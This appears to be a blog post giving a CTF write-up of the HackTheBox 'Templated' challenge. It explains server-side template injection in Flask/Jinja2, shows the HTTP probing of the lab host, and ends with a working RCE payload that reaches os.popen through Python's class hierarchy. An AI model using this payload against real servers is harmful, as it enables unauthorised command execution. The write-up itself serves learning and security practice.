@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SSTI - Hacking Templates and Unleashing Server-Side Power | Nehal Zaman</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="SSTI - Hacking Templates and Unleashing Server-Side Power" />
+<meta name="author" content="Nehal Zaman" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A perpetual learner. CTF player. Programmer." />
+<meta property="og:description" content="A perpetual learner. CTF player. Programmer." />
+<link rel="canonical" href="http://localhost:4000/posts/templated_htb.html" />
+<meta property="og:url" content="http://localhost:4000/posts/templated_htb.html" />
+<meta property="og:site_name" content="Nehal Zaman" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-01T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SSTI - Hacking Templates and Unleashing Server-Side Power" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nehal Zaman"},"dateModified":"2023-08-01T00:00:00-04:00","datePublished":"2023-08-01T00:00:00-04:00","description":"A perpetual learner. CTF player. Programmer.","headline":"SSTI - Hacking Templates and Unleashing Server-Side Power","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/templated_htb.html"},"url":"http://localhost:4000/posts/templated_htb.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Nehal Zaman</h1>
+        </a>
+        <h2>A perpetual learner. CTF player. Programmer.</h2>
+
+        <section id="downloads">
+          
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>1 August 2023</small>
+<h1>SSTI - Hacking Templates and Unleashing Server-Side Power</h1>
+
+<p class="view">by Nehal Zaman</p>
+
+<p><img src="/assets/images/writeups/templated/banner.png" alt="" /></p>
+
+<h1 id="introduction">INTRODUCTION</h1>
+
+<p>Welcome, curious minds, to this blog that will walk you through the <strong>HackTheBox</strong> web challenge called <strong>Templated</strong>.</p>
+
+<p>It is an easy challenge that showcases the exploitation of <strong>Server Side Template Injection (SSTI)</strong> vulnerability.</p>
+
+<p>We will start from the very bottom and end up creating the payload for the vulnerability on our own, understanding every piece of the payload that we will create.</p>
+
+<h1 id="what-is-ssti">WHAT IS SSTI?</h1>
+
+<p><strong>Server Side Template Injection (SSTI)</strong> is a web security vulnerability where a malicious user can manipulate the template of the webpages if the user-controlled data is not properly sanitized and is being passed to the template, resulting in arbitrary code execution in the worst possible scenario.</p>
+
+<p>Let us understand with the help of an example.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">user_input</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'name'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">user_input</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The above is the code for a SSTI-vulnerable <code class="language-plaintext highlighter-rouge">flask</code> application.</p>
+
+<p>And the corresponding <code class="language-plaintext highlighter-rouge">index.html</code> template is:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>SSTI Example<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>Hello, { { name } }!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>In this example, we have a simple Flask application with an <code class="language-plaintext highlighter-rouge">/</code> route that renders the <code class="language-plaintext highlighter-rouge">index.html</code> template. The route takes a query parameter called <code class="language-plaintext highlighter-rouge">name</code> from the user and directly inserts it into the template using <code class="language-plaintext highlighter-rouge">render_template</code>.</p>
+
+<p>While this may look harmless, it has an SSTI vulnerability. An attacker can exploit this vulnerability by sending a malicious request with a crafted <code class="language-plaintext highlighter-rouge">name</code> parameter.</p>
+
+<p>For example:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?name={ { 7 * 7 } }
+</code></pre></div></div>
+
+<p>The server will process this request and render the template, performing the arithmetic operation <code class="language-plaintext highlighter-rouge">7 * 7</code>, and then inserting the result into the HTML. As a result, the rendered template will be:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>SSTI Example<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>Hello, 49!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>In this example, the attacker successfully injected and executed code on the server-side, performing a simple multiplication operation. However, this may not seem harmful at first glance. But imagine if the attacker injected code that read sensitive files or executed system commands; that could lead to significant security breaches.</p>
+
+<p>Now that we have a basic idea of SSTI, let us go through the website.</p>
+
+<h1 id="looking-at-website">LOOKING AT WEBSITE</h1>
+
+<p><img src="/assets/images/writeups/templated/1.png" alt="" /></p>
+
+<p>We can not see anything useful here as the site is still under construction.</p>
+
+<p>But if we intercept the request in burp and observe the response headers, we will get to know that the backend is running on <code class="language-plaintext highlighter-rouge">Werkzeug</code>.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 79
+Server: Werkzeug/1.0.1 Python/3.9.0
+Date: Mon, 31 Jul 2023 19:54:46 GMT
+
+
+<span class="nt">&lt;h1&gt;</span>Site still under construction<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>Proudly powered by Flask/Jinja2<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>So it is confirmed from the web page that the site is built using <code class="language-plaintext highlighter-rouge">Flask</code> and the templating engine being used is <code class="language-plaintext highlighter-rouge">Jinja</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /Nehal-Hacks-For-Good HTTP/1.1
+Host: 167.172.61.89:30122
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 88
+Server: Werkzeug/1.0.1 Python/3.9.0
+Date: Mon, 31 Jul 2023 19:58:46 GMT
+
+
+<span class="nt">&lt;h1&gt;</span>Error 404<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>The page '<span class="nt">&lt;str&gt;</span>Nehal-Hacks-For-Good<span class="nt">&lt;/str&gt;</span>' could not be found<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Also, we can see that if we request to an arbitrary endpoint, the endpoint name is getting reflected back.</p>
+
+<p>So in that case, if the name of the endpoint is not sanitised and getting passed to the Jinja template, we can find a SSTI here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /{ {7*8} } HTTP/1.1
+Host: 167.172.61.89:30122
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 70
+Server: Werkzeug/1.0.1 Python/3.9.0
+Date: Mon, 31 Jul 2023 20:01:05 GMT
+
+
+<span class="nt">&lt;h1&gt;</span>Error 404<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>The page '<span class="nt">&lt;str&gt;</span>56<span class="nt">&lt;/str&gt;</span>' could not be found<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>We have used the same mathematical calculation technique to find a SSTI here.</p>
+
+<p>We can see that the injected <code class="language-plaintext highlighter-rouge">7*8</code> is evaluated and we can see <code class="language-plaintext highlighter-rouge">56</code> in the response.</p>
+
+<p>So, <strong>SSTI</strong> is confirmed here.</p>
+
+<h1 id="building-the-payload">BUILDING THE PAYLOAD</h1>
+
+<p>The whole story of building payload is about starting with a string object, iterate through the class of the string object, going through the python class hierarchy to find a class that have access to builtin functions, create an object of the found class and use the builtins to run arbitrary code.</p>
+
+<p>I will give you a general approach that you can use for building your own custom SSTI payloads:</p>
+
+<ul>
+  <li>
+    <p><strong>Starting with a String Object</strong>: At the heart of every SSTI payload lies a string object. This serves as the foundation for building code snippets that will eventually execute on the server.</p>
+  </li>
+  <li>
+    <p><strong>Accessing the Base <code class="language-plaintext highlighter-rouge">object</code></strong>: By traversing the class hierarchy using <code class="language-plaintext highlighter-rouge">__class__.__base__</code>, you gain access to the base <code class="language-plaintext highlighter-rouge">object</code> (everything in python is a object :)). This step is pivotal in our journey towards RCE.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/writeups/templated/2.png" alt="" /></p>
+
+<ul>
+  <li><strong>Exploring Subclasses</strong>: With access to the base object, you can investigate its subclasses. Each subclass represents a potential opportunity to access essential attributes and methods.</li>
+</ul>
+
+<p><img src="/assets/images/writeups/templated/3.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p><strong>Hunting for <code class="language-plaintext highlighter-rouge">globals</code></strong>: Some subclasses provide access to the <code class="language-plaintext highlighter-rouge">__globals__</code> attribute. When found, this is a significant milestone, as it opens the door to the global namespace of the application, offering access to critical variables and modules.</p>
+  </li>
+  <li>
+    <p><strong>Unraveling <code class="language-plaintext highlighter-rouge">builtins</code></strong>: Finally, leveraging the power of <code class="language-plaintext highlighter-rouge">__globals__</code>, you can reach the coveted <code class="language-plaintext highlighter-rouge">__builtins__</code> attribute. This is the gateway to the Python built-in modules, a treasure trove of functionality.</p>
+  </li>
+</ul>
+
+<p>In SSTI exploitation, the <code class="language-plaintext highlighter-rouge">__builtins__</code> attribute serves as the key to unlocking a vast array of Python built-in modules, allowing you to import and execute arbitrary methods. However, getting to <code class="language-plaintext highlighter-rouge">__builtins__</code> involves traversing the class hierarchy and finding subclasses with access to <code class="language-plaintext highlighter-rouge">__globals__</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">__globals__</code> is essential because it exposes the global namespace of the application. This means that once you have access to it, you can interact with application-specific variables, functions, and modules. By combining this access with <code class="language-plaintext highlighter-rouge">__builtins__</code>, you gain the capability to import and execute arbitrary modules and methods, achieving full RCE.</p>
+
+<p><img src="/assets/images/writeups/templated/4.png" alt="" /></p>
+
+<p>I have used burp <code class="language-plaintext highlighter-rouge">intruder</code> to find the subclass index which has access to <code class="language-plaintext highlighter-rouge">__global__.__builtins__</code>. As you can see, starting from index <code class="language-plaintext highlighter-rouge">80</code> we have access to <code class="language-plaintext highlighter-rouge">__builtins__</code>.</p>
+
+<p>Now we can use <code class="language-plaintext highlighter-rouge">__builtins__</code> function like <code class="language-plaintext highlighter-rouge">__import__</code> to import any arbitrary module (say <code class="language-plaintext highlighter-rouge">os</code> :P) and use any method from that module (say <code class="language-plaintext highlighter-rouge">popen(cmd).read()</code> :P) to run arbitrary code.</p>
+
+<p><img src="/assets/images/writeups/templated/5.png" alt="" /></p>
+
+<p>As you can see, we are successful in running the <code class="language-plaintext highlighter-rouge">id</code> command and we can see the output in the response.</p>
+
+<p>Final payload is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ { 'Nehal-Hacks-For-Good'.__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.__import__('os').popen('id').read() } }
+</code></pre></div></div>
+
+<p>You can look for the flag file now and submit it :)</p>
+
+<h1 id="conclusion">CONCLUSION</h1>
+
+<p>This challenge is all about how non-sanitized user data can be used to exploit a SSTI vulnerability.</p>
+
+<p>We have looked over general steps of how you can build your own payload for exploiting SSTI without blindly spraying SSTI payloads.</p>
+
+<p>That is all in this challenge.</p>
+
+<p>Hope you liked it.</p>
+
+
+
+  <small>tags: <em>SSTI</em> - <em>server side template injection</em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
